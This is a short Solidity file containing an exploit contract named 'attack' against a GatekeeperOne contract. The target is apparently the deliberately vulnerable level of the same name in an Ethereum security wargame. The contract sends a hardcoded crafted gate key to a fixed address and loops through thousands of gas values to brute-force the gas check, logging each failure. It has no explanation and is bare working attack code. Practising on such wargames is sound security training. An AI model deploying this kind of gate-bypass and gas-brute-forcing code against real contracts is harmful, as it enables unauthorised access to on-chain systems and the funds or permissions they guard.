// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract attack {
    event Failed(bytes reason, uint gas);

    function run() external {
        IGatekeeperOne victimContract = IGatekeeperOne(
            0xaD3677504a07fD6e1FC8dC175a18e77bfBF7A102
        );

        uint gas = 10000;
        bytes8 payload = 0x0000000100005325;
        for (uint256 i; i < 8191; i++) {
            gas += 1;
            try victimContract.enter{gas: gas}(payload) {} catch (
                bytes memory reason
            ) {
                emit Failed(reason, gas);
            }
        }
    }
}
